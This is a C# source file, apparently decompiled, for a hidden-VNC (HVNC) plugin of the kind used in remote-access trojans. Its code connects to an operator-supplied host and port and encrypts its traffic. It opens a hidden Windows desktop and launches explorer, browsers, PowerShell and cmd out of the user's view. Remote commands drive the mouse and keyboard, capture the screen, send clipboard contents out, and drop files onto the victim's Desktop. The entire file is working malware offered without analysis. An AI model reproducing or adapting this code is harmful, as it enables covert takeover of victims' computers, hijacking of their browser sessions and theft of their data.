#define DEBUG
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Methods.Native;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Plugin.S.OpenApp;
using S.OpenApp;

namespace HVNC;

internal class Plugin
{
	public class Settings
	{
		public static string Host;

		public static string Port;

		public static string KEY;

		public static string SPL;

		public static string IDD;
	}

	public class ClientSocket
	{
		public static bool isConnected = false;

		public static Socket S;

		public static long BufferLength = 0L;

		public static byte[] Buffer;

		public static MemoryStream MS = new MemoryStream();

		public static void BeginConnect()
		{
			S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			BufferLength = -1L;
			Buffer = new byte[1];
			MS = new MemoryStream();
			S.ReceiveBufferSize = 51200;
			S.SendBufferSize = 51200;
			try
			{
				S.Connect(Settings.Host, Conversions.ToInteger(Settings.Port));
				isConnected = true;
				try
				{
					HandelNative.SetProcessDpiAwareness(2);
				}
				catch
				{
				}
				Helper.ScreenX = Screen.PrimaryScreen.Bounds.Width;
				Helper.ScreenY = Screen.PrimaryScreen.Bounds.Height;
				Send("FormHVNC" + Settings.SPL + Settings.IDD + Settings.SPL + Helper.ScreenX + Settings.SPL + Helper.ScreenY);
				Helper.HigherThan81 = Conversions.ToBoolean(Helper.Isgreaterorequalto81());
				Helper.OpenWindowsDesktop();
				S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, BeginReceive, S);
			}
			catch (Exception)
			{
				isDisconnected();
			}
		}

		public static void BeginReceive(IAsyncResult ar)
		{
			if (!isConnected)
			{
				isDisconnected();
			}
			try
			{
				int num = S.EndReceive(ar);
				if (num > 0)
				{
					if (BufferLength == -1)
					{
						if (Buffer[0] == 0)
						{
							BufferLength = Conversions.ToLong(Helper.BS(MS.ToArray()));
							MS.Dispose();
							MS = new MemoryStream();
							if (BufferLength == 0)
							{
								BufferLength = -1L;
								S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, BeginReceive, S);
								return;
							}
							Buffer = new byte[(int)(BufferLength - 1 + 1)];
						}
						else
						{
							MS.WriteByte(Buffer[0]);
						}
					}
					else
					{
						MS.Write(Buffer, 0, num);
						if (MS.Length == BufferLength)
						{
							Thread thread = new Thread(BeginRead);
							thread.Start(MS.ToArray());
							BufferLength = -1L;
							MS.Dispose();
							MS = new MemoryStream();
							Buffer = new byte[1];
						}
						else
						{
							Buffer = new byte[(int)(BufferLength - MS.Length - 1 + 1)];
						}
					}
					S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, BeginReceive, S);
				}
				else
				{
					isDisconnected();
				}
			}
			catch (Exception)
			{
				isDisconnected();
			}
		}

		public static void BeginRead(object b)
		{
			try
			{
				byte[] b2 = (byte[])b;
				Messages.Read(b2);
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		public static void Send(string msg)
		{
			try
			{
				using MemoryStream memoryStream = new MemoryStream();
				byte[] array = Helper.AES_Encryptor(Helper.SB(msg));
				byte[] array2 = Helper.SB(array.Length.ToString() + Conversions.ToChar("\0"));
				memoryStream.Write(array2, 0, array2.Length);
				memoryStream.Write(array, 0, array.Length);
				S.Poll(-1, SelectMode.SelectWrite);
				S.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
			}
			catch (Exception)
			{
				isDisconnected();
			}
		}

		public static void isDisconnected()
		{
			isConnected = false;
			try
			{
				S.Close();
				S.Dispose();
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
			try
			{
				MS.Close();
				MS.Dispose();
			}
			catch (Exception ex2)
			{
				Debug.WriteLine(ex2.Message);
			}
			try
			{
				T1.Abort();
			}
			catch (Exception ex3)
			{
				Debug.WriteLine(ex3.Message);
			}
			try
			{
				T2.Abort();
			}
			catch (Exception ex4)
			{
				Debug.WriteLine(ex4.Message);
			}
		}

		public static void Ping()
		{
			while (true)
			{
				Thread.Sleep(30000);
				try
				{
					if (S.Connected)
					{
						using MemoryStream memoryStream = new MemoryStream();
						byte[] array = Helper.AES_Encryptor(Helper.SB("PING?"));
						byte[] array2 = Helper.SB(array.Length.ToString() + Conversions.ToChar("\0"));
						memoryStream.Write(array2, 0, array2.Length);
						memoryStream.Write(array, 0, array.Length);
						S.Poll(-1, SelectMode.SelectWrite);
						S.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
						GC.Collect();
					}
				}
				catch (Exception)
				{
					isDisconnected();
				}
			}
		}
	}

	public class Messages
	{
		public static void Read(byte[] b)
		{
			try
			{
				string[] array = Strings.Split(Helper.BS(Helper.AES_Decryptor(b)), Conversions.ToString(Settings.SPL));
				switch (array[0] ?? "")
				{
				case "CloseHVNC":
					ClientSocket.isDisconnected();
					break;
				case "MouseRightUp":
				{
					Debug.WriteLine("MouseRightUp :" + array[1] + ";" + array[2]);
					HideDesktop.Load(Helper.HVNCDesktop);
					int x6 = Conversions.ToInteger(array[1]);
					int y6 = Conversions.ToInteger(array[2]);
					HandelMouse.MouseRghitUp(x6, y6);
					break;
				}
				case "MouseLeftUp":
				{
					Debug.WriteLine("MouseLeftUp :" + array[1] + ";" + array[2]);
					HideDesktop.Load(Helper.HVNCDesktop);
					int x5 = Conversions.ToInteger(array[1]);
					int y5 = Conversions.ToInteger(array[2]);
					HandelMouse.MouseLeftUp(x5, y5);
					break;
				}
				case "PowerShell":
					HideDesktop.Load(Helper.HVNCDesktop);
					PowerShell.Open();
					break;
				case "KeyboardDown":
					HideDesktop.Load(Helper.HVNCDesktop);
					HandelMouse.KeyboardDown(array[1]);
					break;
				case "Paste":
					HideDesktop.Load(Helper.HVNCDesktop);
					HandleClipboard.Paste(array[1]);
					break;
				case "CopyClib":
					ClientSocket.Send("ClibHVNC" + Settings.SPL + Helper.GetText());
					break;
				case "MouseDoubleClick":
				{
					Debug.WriteLine("MouseDoubleClick :" + array[1] + ";" + array[2]);
					HideDesktop.Load(Helper.HVNCDesktop);
					int x4 = Conversions.ToInteger(array[1]);
					int y4 = Conversions.ToInteger(array[2]);
					HandelMouse.MouseDuoblClieck(x4, y4);
					break;
				}
				case "BraveBrowser":
					HideDesktop.Load(Helper.HVNCDesktop);
					Brave.OpenBraveBrowser();
					break;
				case "CustomOpen":
					HideDesktop.Load(Helper.HVNCDesktop);
					CustomOpen.Open(array[1], array[2]);
					break;
				case "EdgeBrowser":
					HideDesktop.Load(Helper.HVNCDesktop);
					Edge.OpenEdgeBrowser();
					break;
				case "ChromeBrowser":
					HideDesktop.Load(Helper.HVNCDesktop);
					Chrome.OpenChromeBrowser();
					break;
				case "CommandPrompt":
					HideDesktop.Load(Helper.HVNCDesktop);
					CommandPrompt.Open();
					break;
				case "MouseLeftDown":
				{
					Debug.WriteLine("MouseLeftDown :" + array[1] + ";" + array[2]);
					HideDesktop.Load(Helper.HVNCDesktop);
					int x3 = Conversions.ToInteger(array[1]);
					int y3 = Conversions.ToInteger(array[2]);
					HandelMouse.MouseLeftDown(x3, y3);
					break;
				}
				case "FireFoxBrowser":
					HideDesktop.Load(Helper.HVNCDesktop);
					FireFox.OpenFireFoxBrowser();
					break;
				case "MouseRightDown":
				{
					Debug.WriteLine("MouseRightDown :" + array[1] + ";" + array[2]);
					HideDesktop.Load(Helper.HVNCDesktop);
					int x2 = Conversions.ToInteger(array[1]);
					int y2 = Conversions.ToInteger(array[2]);
					HandelMouse.MouseRightDown(x2, y2);
					break;
				}
				case "MouseMove":
				{
					Debug.WriteLine("MouseMove :" + array[1] + ";" + array[2]);
					HideDesktop.Load(Helper.HVNCDesktop);
					int x = Conversions.ToInteger(array[1]);
					int y = Conversions.ToInteger(array[2]);
					HandelMouse.MouseMove(x, y);
					break;
				}
				case "CloseWindow":
					HideDesktop.Load(Helper.HVNCDesktop);
					HandelMouse.CloseWindow();
					break;
				case "MinTop":
					HideDesktop.Load(Helper.HVNCDesktop);
					HandelMouse.MinTop();
					break;
				case "RestoreMaxTop":
					HideDesktop.Load(Helper.HVNCDesktop);
					HandelMouse.RestoreMaxTop();
					break;
				case "Cap":
					if (!Helper.IsRunning)
					{
					}
					HideDesktop.Load(Helper.HVNCDesktop);
					Helper.IsRunning = true;
					RemoteDesktop.Capture(Conversions.ToInteger(array[1]), Conversions.ToDouble(array[2]));
					break;
				case "DeskDrop":
				{
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
					File.WriteAllBytes(folderPath + "\\" + array[1], Helper.Decompress(Convert.FromBase64String(array[2])));
					break;
				}
				case "ScrollDown":
					HideDesktop.Load(Helper.HVNCDesktop);
					HandelMouse.ScrollDown();
					break;
				case "ScrollUp":
					HideDesktop.Load(Helper.HVNCDesktop);
					HandelMouse.ScrollUp();
					break;
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}
	}

	internal static class Helper
	{
		public static bool HigherThan81 = false;

		public static int PID = 0;

		private static readonly List<int> PIDs = new List<int>();

		public static string NameDesktop = "RemoteDesktopS";

		public static HideDesktop HVNCDesktop = null;

		public static int ScreenX;

		public static int ScreenY;

		public static IntPtr CheckIntptr;

		public static bool StateCapture = false;

		public static object A = new object();

		public static bool IsRunning { get; set; }

		public static string GetText()
		{
			string ReturnValue = string.Empty;
			Thread thread = new Thread((ThreadStart)delegate
			{
				try
				{
					ReturnValue = Clipboard.GetText();
				}
				catch (Exception ex)
				{
					Debug.WriteLine(ex.Message);
				}
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
			return ReturnValue;
		}

		public static byte[] Decompress(byte[] input)
		{
			using MemoryStream memoryStream = new MemoryStream(input);
			byte[] array = new byte[4];
			memoryStream.Read(array, 0, 4);
			int num = BitConverter.ToInt32(array, 0);
			using GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
			byte[] array2 = new byte[num];
			gZipStream.Read(array2, 0, num);
			return array2;
		}

		public static byte[] Compress(byte[] input)
		{
			using MemoryStream memoryStream = new MemoryStream();
			byte[] bytes = BitConverter.GetBytes(input.Length);
			memoryStream.Write(bytes, 0, 4);
			using (GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Compress))
			{
				gZipStream.Write(input, 0, input.Length);
				gZipStream.Flush();
			}
			return memoryStream.ToArray();
		}

		public static object Isgreaterorequalto81()
		{
			object result = null;
			try
			{
				OperatingSystem oSVersion = Environment.OSVersion;
				Version version = oSVersion.Version;
				if (oSVersion.Platform == PlatformID.Win32NT)
				{
					int major = version.Major;
					if (major == 6 && version.Minor != 0 && version.Minor != 1)
					{
						result = true;
						return result;
					}
				}
				result = false;
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static byte[] SB(string s)
		{
			return Encoding.UTF8.GetBytes(s);
		}

		public static string BS(byte[] b)
		{
			return Encoding.UTF8.GetString(b);
		}

		public static void SendMSG(string msg)
		{
			ClientSocket.Send("HvncMSG" + Settings.SPL + Settings.IDD + Settings.SPL + msg);
		}

		public static byte[] AES_Encryptor(byte[] input)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			try
			{
				rijndaelManaged.Key = mD5CryptoServiceProvider.ComputeHash(SB(Settings.KEY));
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
				return cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
			return null;
		}

		public static byte[] AES_Decryptor(byte[] input)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			try
			{
				rijndaelManaged.Key = mD5CryptoServiceProvider.ComputeHash(SB(Settings.KEY));
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
				return cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
			return null;
		}

		public static void StartExplorer(string strDesktopName)
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced", writable: true);
			int num = Conversions.ToInteger(registryKey.GetValue("TaskbarGlomLevel", true));
			int num2 = 2;
			if (num != num2)
			{
				registryKey.SetValue("TaskbarGlomLevel", num2);
			}
			string path = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\explorer.exe";
			HideDesktop.CreateProcess(path, strDesktopName, bAppName: true);
			registryKey.SetValue("TaskbarGlomLevel", num);
			registryKey.Close();
			try
			{
				Process process = Process.GetProcessesByName("explorer").FirstOrDefault((Process x) => !PIDs.Any((int y) => y == x.Id));
				if (process != null)
				{
					PID = process.Id;
				}
			}
			catch
			{
				SendMSG("Error: Explorer");
			}
		}

		[DllImport("user32.dll")]
		public static extern int GetSystemMetrics(int smIndex);

		public static void OpenWindowsDesktop()
		{
			try
			{
				HandelMouse.TTTT = GetSystemMetrics(4);
				if (HandelMouse.TTTT < 5)
				{
					HandelMouse.TTTT = 20;
				}
				string nameDesktop = NameDesktop;
				HVNCDesktop = HideDesktop.OpenDesktop(nameDesktop);
				if (HVNCDesktop == null)
				{
					HVNCDesktop = HideDesktop.CreateDesktop(nameDesktop);
					HideDesktop.Load(HVNCDesktop);
					if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						StartExplorer(nameDesktop);
					}
					else
					{
						HideDesktop.CreateProcess("powershell.exe -c explorer shell:::{3080F90E-D7AD-11D9-BD98-0000947B0257}", "RemoteDesktopS", bAppName: false);
					}
				}
				SendMSG("Ready..");
			}
			catch (Exception ex)
			{
				SendMSG("Error: " + ex.Message);
			}
		}
	}

	public static Thread T1 = new Thread(ClientSocket.BeginConnect);

	public static Thread T2 = new Thread(ClientSocket.Ping);

	public static void Run(string H, string P, string SL, string K, string id)
	{
		try
		{
			Settings.Host = H;
			Settings.Port = P;
			Settings.SPL = SL;
			Settings.KEY = K;
			Settings.IDD = id;
			T1.Start();
			T2.Start();
		}
		catch (Exception ex)
		{
			Debug.WriteLine(ex.Message);
		}
	}
}
